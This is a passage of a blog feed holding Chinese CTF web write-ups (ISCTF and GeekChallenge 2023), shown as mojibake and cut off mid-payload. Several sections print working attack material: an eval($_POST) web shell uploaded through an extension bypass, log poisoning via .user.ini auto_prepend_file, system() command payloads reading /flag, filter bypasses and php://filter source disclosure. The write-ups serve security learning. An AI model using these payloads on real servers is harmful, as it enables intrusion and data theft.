assert($_POST[â€˜codeâ€™]);<br>assertå’ŒevalåŠŸèƒ½ç›¸åŒï¼Œä½†assertä¸ç”¨åœ¨å‡½æ•°åé¢åŠ <code>;</code><br>æ‰€ä»¥ç»“æœå¾ˆç®€å•</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">code=system(&#x27;ls /&#x27;)<br><span class="hljs-comment">//bin dev etc flaggggggg.txt home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br>æ²¡æœ‰ç¦/å’Œ&#x27;,é‚£å°±éšä¾¿ç»•è¿‡è¿‡æ»¤äº†<br>code=system(&#x27;c\at /f*&#x27;)<br>//ISCTF&#123;437d25ca-b36f-<span class="hljs-number">4204</span>-b8af-<span class="hljs-number">7937</span>eab665a9&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h2><p>è¿™é¢˜å¯¹æ–‡ä»¶å†…éƒ¨çš„å®¡æŸ¥å¾ˆä¸¥<br>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨æ—¥å¿—åŒ…å«æ¥è·å–<br>ä¸Šä¼ .user.ini</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">GIF89a<br>auto_prepend_file=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…åå†uaå¤´ååŠ å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//ä¸èƒ½ç”¨&quot;&quot;ï¼Œä¼šæŠ¥é”™</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥çŒœflagçš„ä½ç½®ç›´æ¥è·å–<br>.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h2><p>show me your parameter!!!Wrong parameter!!!<br>ä»…æœ‰çš„ä¸€è¡Œhintæç¤ºæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ­£ç¡®çš„å‚æ•°<br>æŠ“åŒ…æºä»£ç ä»€ä¹ˆçš„éƒ½æ²¡æœ‰å‘ç°å¯åˆ©ç”¨çš„ä¿¡æ¯<br>dirsearchæ‰«æ‰«ï¼Œ<br>æ‰«å‡ºäº†ä¸€ä¸ªindex.bakæ–‡ä»¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">string_to_int_array</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-keyword">const</span> intArr = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;str.<span class="hljs-property">length</span>;i++)&#123;<br>          <span class="hljs-keyword">const</span> charcode = str.<span class="hljs-title function_">charCodeAt</span>(i);<span class="hljs-comment">/*è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ Unicode ç¼–ç ï¼Œè¿™é‡Œç›´æ¥ç†è§£ä¸ºasciiç å€¼*/</span><br><br>          <span class="hljs-keyword">const</span> partA = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(charcode / <span class="hljs-number">26</span>);<span class="hljs-comment">/*è¿”å›å°äºç­‰äºä¸€ä¸ªç»™å®šæ•°å­—çš„æœ€å¤§æ•´æ•°ï¼Œå‘ä¸‹å–æ•´*/</span><br>          <span class="hljs-keyword">const</span> partB = charcode % <span class="hljs-number">26</span>;<br><br>          intArr.<span class="hljs-title function_">push</span>(partA);<span class="hljs-comment">/*è¿™ä¸¤è¡Œçš„æ„æ€æ˜¯åœ¨æ•°ç»„æœ«å°¾æ·»åŠ æ–°å…ƒç´ */</span><br>          intArr.<span class="hljs-title function_">push</span>(partB);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> intArr;<br>      &#125;<br><br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-params">int_array</span>)&#123;<br>        <span class="hljs-keyword">let</span> txt = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;int_array.<span class="hljs-property">length</span>;i++)&#123;<br>          txt += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">97</span> + int_array[i]);<span class="hljs-comment">/*è¿”å›ASCIIç å€¼å¯¹åº”çš„å­—ç¬¦*/</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> txt;<br>      &#125;<br><br><br><span class="hljs-keyword">const</span> hash = <span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-title function_">string_to_int_array</span>(<span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-title function_">string_to_int_array</span>(parameter))));<br><span class="hljs-keyword">if</span>(hash === <span class="hljs-string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>)&#123;<br>            <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;flag.html&#x27;</span>;<br>          &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;fail&#x27;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>          &#125;<br><br></code></pre></td></tr></table></figure><p>æ˜¯ä¸ªJavaScriptä»£ç ï¼Œä¸Šé¢å·²ç»ç»™äº†å‡½æ•°æ‰€å¯¹åº”çš„æ„æ€<br>è¦ä½¿hash&#x3D;&#x3D;&#x3D;dxdydxdudxdtdxeadxekdxeaæ‰èƒ½è·å¾—æˆ‘ä»¬è¦çš„<br>éœ€è¦å†™ä¸€ä¸ªè„šæœ¬ï¼Œå…ˆåˆ†æä¸€ä¸‹<br>åµŒå¥—å‡½æ•°ï¼Œä»æœ€é‡Œé¢å¼€å§‹è®¡ç®—<br>è®¡ç®—è¿‡ç¨‹å¦‚ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span> intarr[<span class="hljs-number">3</span>,<span class="hljs-number">19</span>]-&gt;txt=dt-&gt;intarr[<span class="hljs-number">3</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>]-&gt;txt=dwem<br><span class="hljs-attribute">b</span> intarr[<span class="hljs-number">3</span>,<span class="hljs-number">20</span>]-&gt;txt=du-&gt;intarr[<span class="hljs-number">3</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>]-&gt;txt=dwen<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¾“å…¥ä¸€ä¸ªå­—ç¬¦æ‰€å¯¹åº”çš„æ˜¯hashæ‰€åŒ¹é…çš„4ä¸ªå­—ç¬¦<br>dxdydxdudxdtdxeadxekdxeaä¸º24ä¸ªå­—ç¬¦ï¼Œè¯´æ˜æˆ‘ä»¬éœ€è¦è¾“å…¥6ä¸ªå­—ç¬¦ï¼Œè«éæ˜¯mihoyoğŸ˜‹<br>åŸºäºä¸Šé¢çš„è®¡ç®—è§„åˆ™ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scss">import requests<br>import <span class="hljs-selector-tag">time</span><br><br><br>def <span class="hljs-built_in">string_to_int</span>(str):<br>    intarr = []<br>    for k in str:<br>        parta = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">ord</span>(k) / <span class="hljs-number">26</span>)<br>        partb = <span class="hljs-built_in">ord</span>(k) % <span class="hljs-number">26</span><br>        intarr.<span class="hljs-built_in">append</span>(parta)<br>        intarr.<span class="hljs-built_in">append</span>(partb)<br>    return intarr<br><br><br>def <span class="hljs-built_in">int_to_string</span>(intarr):<br>    txt = <span class="hljs-string">&#x27;&#x27;</span><br>    for j in intarr:<br>        txt = txt+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>+j)<br>    return txt<br><br><br>for i in <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:<br>    heheh = <span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(<span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(i))))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,heheh))<br><br><br>wtf=<span class="hljs-string">&#x27;mihoyo&#x27;</span><br>wco=<span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(<span class="hljs-built_in">int_to_string</span>(<span class="hljs-built_in">string_to_int</span>(wtf))))<br><span class="hljs-built_in">print</span>(wco)<br></code></pre></td></tr></table></figure><p>pythonè„šæœ¬ä¸ç”¨è¯´ï¼Œå’Œä¸Šé¢jså®ç°è¿‡ç¨‹æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥çœ‹ç»“æœ</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">a:</span>dwem<br><span class="hljs-symbol">b:</span>dwen<br><span class="hljs-symbol">c:</span>dweo<br><span class="hljs-symbol">d:</span>dwep<br><span class="hljs-symbol">e:</span>dweq<br><span class="hljs-symbol">f:</span>dwer<br><span class="hljs-symbol">g:</span>dwes<br><span class="hljs-symbol">h:</span>dxdt<br><span class="hljs-symbol">i:</span>dxdu<br><span class="hljs-symbol">j:</span>dxdv<br><span class="hljs-symbol">k:</span>dxdw<br><span class="hljs-symbol">l:</span>dxdx<br><span class="hljs-symbol">m:</span>dxdy<br><span class="hljs-symbol">n:</span>dxdz<br><span class="hljs-symbol">o:</span>dxea<br><span class="hljs-symbol">p:</span>dxeb<br><span class="hljs-symbol">q:</span>dxec<br><span class="hljs-symbol">r:</span>dxed<br><span class="hljs-symbol">s:</span>dxee<br><span class="hljs-symbol">t:</span>dxef<br><span class="hljs-symbol">u:</span>dxeg<br><span class="hljs-symbol">v:</span>dxeh<br><span class="hljs-symbol">w:</span>dxei<br><span class="hljs-symbol">x:</span>dxej<br><span class="hljs-symbol">y:</span>dxek<br><span class="hljs-symbol">z:</span>dxel<br><span class="hljs-symbol">A:</span>dveg<br><span class="hljs-symbol">B:</span>dveh<br><span class="hljs-symbol">C:</span>dvei<br><span class="hljs-symbol">D:</span>dvej<br><span class="hljs-symbol">E:</span>dvek<br><span class="hljs-symbol">F:</span>dvel<br><span class="hljs-symbol">G:</span>dvem<br><span class="hljs-symbol">H:</span>dven<br><span class="hljs-symbol">I:</span>dveo<br><span class="hljs-symbol">J:</span>dvep<br><span class="hljs-symbol">K:</span>dveq<br><span class="hljs-symbol">L:</span>dver<br><span class="hljs-symbol">M:</span>dves<br><span class="hljs-symbol">N:</span>dwdt<br><span class="hljs-symbol">O:</span>dwdu<br><span class="hljs-symbol">P:</span>dwdv<br><span class="hljs-symbol">Q:</span>dwdw<br><span class="hljs-symbol">R:</span>dwdx<br><span class="hljs-symbol">S:</span>dwdy<br><span class="hljs-symbol">T:</span>dwdz<br><span class="hljs-symbol">U:</span>dwea<br><span class="hljs-symbol">V:</span>dweb<br><span class="hljs-symbol">W:</span>dwec<br><span class="hljs-symbol">X:</span>dwed<br><span class="hljs-symbol">Y:</span>dwee<br><span class="hljs-symbol">Z:</span>dwef<br>dxdydxdudxdtdxeadxekdxea<br></code></pre></td></tr></table></figure><p>çœŸçš„æ˜¯mihoyoå“ğŸ˜<br>payloadï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?mihoyo=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GeekChallenge_2023</title>
    <link href="/2023/11/14/GeekChallenge_2023/"/>
    <url>/2023/11/14/GeekChallenge_2023/</url>
    
    <content type="html"><![CDATA[<h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p>è¯·postä¼ å‚usernameå’Œpasswordè¿›è¡Œç™»å½•<br>é‚£ä¹ˆæˆ‘ä»¬éšä¾¿post<br>æ˜¾ç¤ºå¯†ç é”™è¯¯<br>æŸ¥çœ‹æºç å‘ç°å¯†ç è¢«è—<br>åœ¨é¡µé¢ä¸­æŸ¥æ‰¾æ²¡æœ‰ç»“æœ<br>ç”¨dirsearchæœä¸€ä¸‹<br>æœåˆ°äº†robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/o2takuXX&#x27;s_username_and_password.txt<br></code></pre></td></tr></table></figure><p>è¿›å…¥è·å¾—è´¦æˆ·å¯†ç ï¼Œè¿”å›ç¬¬ä¸€ä¸ªç•Œé¢è¾“å…¥</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin<br><span class="hljs-symbol">password:</span>@dm1N123456r00t<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>ä¸ºäº†æ–¹ä¾¿ï¼Œåé¢éƒ½ç”¨burpæŠ“åŒ…æ“ä½œ</p><ul><li><p>å¿…é¡»æ¥æºè‡ªsycsec.com<br>payload:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> sycsec.com<br></code></pre></td></tr></table></figure></li><li><p>è¯·ä½¿ç”¨Sycloveræµè§ˆå™¨<br>payload:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: Syclover<br></code></pre></td></tr></table></figure></li><li><p>è¯·ä»localhostè®¿é—®<br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>-forwarded-for: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure></li><li><p>è¯·ä½¿ç”¨Syc.vipä»£ç†</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span><span class="hljs-variable">a:Syc</span>.vip<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_O2TAKUXX&#x27;</span>]==<span class="hljs-string">&quot;GiveMeFlag&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">O2TAKUXX:</span> GiveMeFlag<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">SYC&#123;<span class="hljs-symbol">HttP_1s_E@</span>sY&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/ZGK3XJNLBAXUZGWP.png"></p><h2 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜<br>ä¸Šä¼ 4.txt<br><img src="/images/C7VD364KWICUPM7QAE0Q.png"><br>txtè¢«è¿‡æ»¤äº†<br>ä¸Šä¼ 4.php<br><img src="/images/I779FMMTZAWY1JKB1WX.png"><br>åç¼€è¿‡äº†ï¼Œçœ‹æ¥phpæ²¡è¢«è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯è¢«è¿‡æ»¤äº†ä»€ä¹ˆå¯¼è‡´æ²¡æœ‰ä¸Šä¼ æˆåŠŸ</p><p>ä¸Šä¼ 4.png<br><img src="/images/DTD1TGD123GY4R4ACLDL0.png"><br>æ­£ç¡®çš„ä¸Šä¼ æ–¹å¼æ˜¯è¿™ç§<br>è¦æ£€æŸ¥åç¼€ï¼Œå¤´éƒ¨ï¼Œæ–‡ä»¶å†…å®¹æ‰èƒ½ä¸Šä¼ <br>æ¥ç€å›åˆ°ä¸Šé¢çš„php<br>pngæ˜¯åç¼€å¤´éƒ¨éƒ½è¿‡ï¼Œè€Œphpåªè¿‡äº†åç¼€ï¼ŒæŠŠä»–ä»¬ç»“åˆä¸€ä¸‹è¯•è¯•<br>ä¸Šä¼ 4.pngå¹¶æŠ“åŒ…</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span> <span class="hljs-variable">@eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºå¯¹æ–‡ä»¶å†…å®¹æœ‰æ£€æŸ¥ï¼Œæ‰€ä»¥æŠŠphpæ¢ä¸º&#x3D;<br>æŠ“åŒ…åæŠŠåå­—æ”¹ä¸º4.png.php<br><img src="/images/LLXNXV4N453.png"><br>é€šè¿‡<br>è¿›å…¥æ–‡ä»¶å­˜å‚¨å°±å°±å¯ä»¥æ— éšœç¢RCEäº†</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);<br><span class="hljs-comment">//bin dev etc flag flag.sh home lib media mnt proc root run sbin srv sys tmp usr var </span><br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br><span class="hljs-comment">//SYC&#123;mKs0jSTEiW7n47bMPz&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>]) &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>]) &#123;<br>            <span class="hljs-variable">$array1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>];<br>            <span class="hljs-variable">$array2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array2</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å†ç»•æœ€åä¸€æ­¥å§&quot;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å¥½å“©ï¼Œå¿«æ‹¿åˆ°flagå•¦&quot;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿™é‡Œç»•ä¸è¿‡å»ï¼ŒQWå¯ä¸ç­”åº”äº†å“ˆ&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å˜¿å˜¿å˜¿ï¼Œä½ åˆ«æ€¥å•Š&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä¸ä¼šå§ä¸ä¼šå§ï¼Œä¸ä¼šç¬¬ä¸€æ­¥å°±å¡ä½äº†å§ï¼Œyxxä¼šç§ä¸èµ·ä½ çš„ï¼&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªif</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(isset($_GET[<span class="hljs-string">&#x27;syc&#x27;</span>])</span></span>&amp;&amp;<span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;syc&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;syc&#x27;</span>]</span> !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>^è¡¨ç¤ºåŒ¹é…å¼€å¤´$è¡¨ç¤ºåŒ¹é…åˆ°ç»“å°¾<br>æˆ‘å…ˆæƒ³åˆ°çš„æ˜¯æ›¿æ¢ç©ºæ ¼,åœ¨æœ¬åœ°ç¯å¢ƒæµ‹è¯•ä¸­ä¸€ç›´ä¹Ÿæ²¡é€šè¿‡<br>preg_matchä¹Ÿæœ‰ç»•è¿‡çš„æ–¹å¼<br>åœ¨å­—ç¬¦ä¸²ååŠ å…¥%0aè¿”å›çš„ä¹Ÿä¸ºtrue<br>åŒæ—¶åé¢æ¯”è¾ƒä¸ºå¼ºæ¯”è¾ƒä¸èƒ½ä¸%0aåŒ¹é…<br>æ‰€ä»¥payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">syc</span>=Welcome <span class="hljs-keyword">to</span> GEEK 